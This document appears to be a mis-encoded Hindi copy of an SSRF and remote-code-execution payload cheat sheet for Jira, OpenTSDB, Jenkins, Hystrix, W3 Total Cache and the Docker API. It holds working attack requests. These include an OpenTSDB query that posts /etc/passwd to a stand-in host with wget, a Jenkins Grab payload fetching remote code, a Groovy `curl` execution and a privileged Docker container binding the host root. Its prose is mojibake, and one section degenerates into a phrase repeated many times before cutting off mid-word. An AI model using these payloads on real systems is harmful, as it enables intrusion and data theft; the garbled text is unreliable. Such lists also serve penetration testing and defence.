/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## рдЬреАрд░рд╛

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдВрдзрд┐рдд рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

**SSRF рдХреИрдирд╛рд░реА: iconUriServlet - рдЬреАрд░рд╛ < 7.3.5 (CVE-2017-9506)**

[рдЕрдЯрд▓рд╛рд╕рд┐рдпрди рд╕реБрд░рдХреНрд╖рд╛ рдЯрд┐рдХрдЯ OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[рдЕрдЯрд▓рд╛рд╕рд┐рдпрди рд╕реБрд░рдХреНрд╖рд╛ рдЯрд┐рдХрдЯ JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## рдЕрдиреНрдп рдЕрдЯрд▓рд╛рд╕рд┐рдпрди рдЙрддреНрдкрд╛рдж

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

**SSRF рдХреИрдирд╛рд░реА: iconUriServlet (CVE-2017-9506)**:

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[рдЕрдЯрд▓рд╛рд╕рд┐рдпрди рд╕реБрд░рдХреНрд╖рд╛ рдЯрд┐рдХрдЯ OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 4242**

[OpenTSDB рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF рдХреИрдирд╛рд░реА: RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд░реНрд▓**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF рдХреИрдирд╛рд░реА: RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд░реНрд▓ - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## рдЬреЗрдВрдХрд┐рдиреНрд╕

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8888**

рдпрд╣рд╛рдВ [рдПрдХ рд╢рд╛рдирджрд╛рд░ рд▓реЗрдЦ](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html) рд╣реИред

**SSRF рдХреИрдирд░реА: CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

рдпрд╣рд╛рдВ рджрд┐рдП рдЧрдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ рдФрд░ GET рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ: [рдЬреЗрдВрдХрд┐рдиреНрд╕ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рднрд╛рдЧ 2 - рдЕрдирдЕрдереЗрдВрдЯрд┐рдХреЗрдЯреЗрдб RCE рдХреЗ рд▓рд┐рдП рдореЗрдЯрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**рдЧреНрд░реВрд╡реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**

рдЧреНрд░реВрд╡реА рдПрдХ рдЬрд╛рд╡рд╛ рдЖрдзрд╛рд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди (RCE) рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ SSRF рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк рдЧреНрд░реВрд╡реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рдпреВрдЖрд░рдПрд▓ рдкрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рд╕реЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк рдЧреНрд░реВрд╡реА рдХреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдореЛрдЯ рдХрдорд╛рдВрдбреНрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рд╕реЗ, рдЖрдк SSRF рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреНрд░реВрд╡реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рднрд┐рдиреНрди рдЧреНрд░реВрд╡реА рдЖрдзрд╛рд░рд┐рдд рдРрдкреНрд╕ рдФрд░ рдлреНрд░реЗрдорд╡рд░реНрдХреНрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЬреЗрдирдХрд┐рдВрд╕, рдЧреНрд░реЗрдЗрд▓реНрд╕, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рд╕рд░реНрдЪ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рд▓реЙрдЧрд╕реНрдЯреИрд╢рди, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖрдИ рдЧреЗрдЯрд╡реЗ, рдПрд▓рд╛рд╕реНрдЯрд┐рдХ рдПрдкреАрдЖ
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix рдбреИрд╢рдмреЛрд░реНрдб

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080**

Spring Cloud Netflix, рд╕рдВрд╕реНрдХрд░рдг 2.2.x рд╕реЗ рдкрд╣рд▓реЗ 2.2.4, рд╕рдВрд╕реНрдХрд░рдг 2.1.x рд╕реЗ рдкрд╣рд▓реЗ 2.1.6.

**SSRF рдХреИрдирд╛рд░реА: CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдВрдзрд┐рдд рдкреЛрд░реНрдЯ: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF рдХреИрдирд╛рд░реА: CVE-2019-6715**

рдЗрд╕реЗ рдПрдХ PUT рдЕрдиреБрд░реЛрдз рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF рдХреИрдирд░реА**

рдЗрд╕ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдгрддрд╛ рдХреЗ рд▓рд┐рдП рд╕реВрдЪрдирд╛ рдпрд╣рд╛рдВ рдЬрд╛рд░реА рдХреА рдЧрдИ рдереА: [W3 Total Cache SSRF vulnerability](https://klikki.fi/adv/w3\_total\_cache.html)

рдпрд╣ PHP рдХреЛрдб рдЖрдкрдХреЗ SSRF рдХреИрдирд░реА рд╣реЛрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ (рдЕрдкрдиреЗ рдХреИрдирд░реА рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рде `url` рдХреЛ рдмрджрд▓реЗрдВ):
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## рдбреЙрдХрд░

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 2375, 2376 (SSL)**

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЖрдВрдзреЗ SSRF рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдереЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдХреА API рдХреА рдореМрдЬреВрджрдЧреА рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
/containers/json
/secrets
/services
```
**рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рдбреЙрдХрд░ рдЗрдореЗрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE**
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
